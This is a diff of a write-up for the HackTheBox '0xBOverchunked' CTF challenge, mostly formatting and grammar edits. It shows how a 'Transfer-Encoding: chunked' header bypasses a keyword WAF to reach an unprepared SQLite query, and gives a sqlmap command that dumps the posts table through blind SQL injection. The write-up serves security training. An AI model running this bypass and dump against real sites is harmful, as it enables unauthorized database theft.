@@ -12,9 +12,9 @@ image:
 
 ### Challenge Description: Are you able to retrieve the 6th character from the database?
 
-You can download the task source code from here → https://app.hackthebox.com/challenges/0xBOverchunked
+You can download the task source code from here → [HackTheBox Challenge](https://app.hackthebox.com/challenges/0xBOverchunked)
 
-App Structure:
+### App Structure:
 
 ```terminal
 .
@@ -56,15 +56,15 @@ After downloading the source code and unzipping it, let’s analyze it.
 
 ![Challenge Homepage](/assets/img/0xBOverchunked/main.webp)
 
-Searching by IDs seems to be an interesting functionality.
+Searching by ID seems to be an interesting functionality.
 
-Play with the search bar and know how it works, then test it for vulnerabilities
+Play around with the search bar to understand how it works, then test it for vulnerabilities.
 
-While navigating through files if you looked at Cursor.php you’ll see two functions unsafequery and safequery the unsafequery function that takes $pdo, $id arguments and execute it inside a SQL query and there is no existence for a prepared statement but the safequery function takes the same arguments and execute it inside a SQL query but in a prepared statement.
+While navigating through the files, if you look at `Cursor.php`, you’ll see two functions: `unsafequery` and `safequery`. The `unsafequery` function takes `$pdo` and `$id` as arguments and executes them inside an SQL query without a prepared statement. However, the `safequery` function takes the same parameters and executes them using a prepared statement.
 
-`Note` If you don’t know what is a prepared statement, you can read about it here → https://www.w3schools.com/php/php_mysql_prepared_statements.asp
+**Note:** If you don’t know what a prepared statement is, you can read about it here → [Prepared Statements](https://www.w3schools.com/php/php_mysql_prepared_statements.asp)
 
-```terminal
+```php
 <?php
 require_once 'Connect.php';
 
@@ -102,15 +102,15 @@ function unsafequery($pdo, $id)
 ?>
 ```
 
-Then, if we decide to inject some SQL, you’ll get this message:
+If you try to inject some SQL, you’ll get this message:
 
 ![WAF_Message](/assets/img/0xBOverchunked/waf.webp)
 
-Seems like a WAF is being used (Actually you already know from the waf.php file :D)
+It seems like a WAF is being used (actually, you already know this from the `waf.php` file :D).
 
-Let’s navigate through `waf.php`
+Let’s navigate through `waf.php`.
 
-```terminal
+```php
 <?php
 function waf_sql_injection($input)
 {
@@ -166,15 +166,15 @@ function waf_sql_injection($input)
 ?>
 ```
 
-The foreach loop looks for any SQL keywords in the search input and sanitizes it.
+The `foreach` loop searches for SQL keywords in the search input and sanitizes it.
 
-Looks a very restrictive WAF.
+It looks like a very restrictive WAF.
 
-But how we can bypass this WAF and reach the unsafequery function?
+But how can we bypass this WAF and reach the `unsafequery` function?
 
-While analyzing `SearchHandler.php`, we’ll see this if statement
+While analyzing `SearchHandler.php`, we’ll see this `if` statement:
 
-```terminal
+```php
 if (isset($_SERVER["HTTP_TRANSFER_ENCODING"]) && $_SERVER["HTTP_TRANSFER_ENCODING"] == "chunked")
 {
     $search = $_POST['search'];
@@ -195,13 +195,13 @@ if (isset($_SERVER["HTTP_TRANSFER_ENCODING"]) && $_SERVER["HTTP_TRANSFER_ENCODIN
 }
 ```
 
-This if statement looks for the Transfer-Encoding header with the value chunked (Nah, it has nothing to do with HTTP Request Smuggling).
+This statement checks for the `Transfer-Encoding` header with the value `chunked` (it has nothing to do with HTTP Request Smuggling).
 
-If we included the Transfer-Encoding: Chunked header in our request, we’ll reach the unsafequery function and inject some SQL.
+If we include the `Transfer-Encoding: chunked` header in our request, we’ll reach the `unsafequery` function and inject some SQL.
 
-### Let’s get the flag
+### Let’s Get the Flag
 
-Request I used:
+Request used:
 
 ```
 POST /Controllers/Handlers/SearchHandler.php HTTP/1.1
@@ -226,7 +226,8 @@ Then run `sqlmap` on that request:
 ```terminal
 sqlmap -r request --risk=3 --level=5 --dbms=sqlite --ignore-code=500 --dump -T posts --threads 10
 ```
-`sqlmap` will detect it's a blind SQL injection:
+
+`sqlmap` will detect a blind SQL injection:
 
 ```terminal
 sqlmap resumed the following injection point(s) from stored session:
@@ -243,22 +244,7 @@ Parameter: search (POST)
 web application technology: Apache
 back-end DBMS: SQLite
 ```
-After a few minutes, you’ll get the flag.
 
-```terminal
-Database: <current>
-Table: posts
-[6 entries]
-+----+-------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+
-| id | image | gamedesc                                                                                                                                                           | gamename    |
-+----+-------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+
-| 1  | 1.png | A small, yellow, mouse-like creature with a lightning bolt-shaped tail. Pikachu is one of the most popular and recognizable characters from the Pokemon franchise. | Pikachu     |
-| 2  | 2.png | Pac-Man is a classic arcade game where you control a yellow character and navigate through a maze, eating dots and avoiding ghosts.                                | Pac-Man     |
-| 3  | 3.png | He is a blue anthropomorphic hedgehog who is known for his incredible speed and his ability to run faster than the speed of sound.                                 | Sonic       |
-| 4  | 4.png | Its me, Mario, an Italian plumber who must save Princess Toadstool from the evil Bowser.                                                                           | Super Mario |
-| 5  | 5.png | Donkey Kong is known for his incredible strength, agility, and his ability to swing from vines and barrels.                                                        | Donkey Kong |
-| 6  | 6.png | HTB{f4k3_fl4_f0r_t35t1ng}                                                                                                                                          | Flag        |
-+----+-------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+
-```
+After a few minutes, you’ll get the flag.
 
 ### Congratulations!
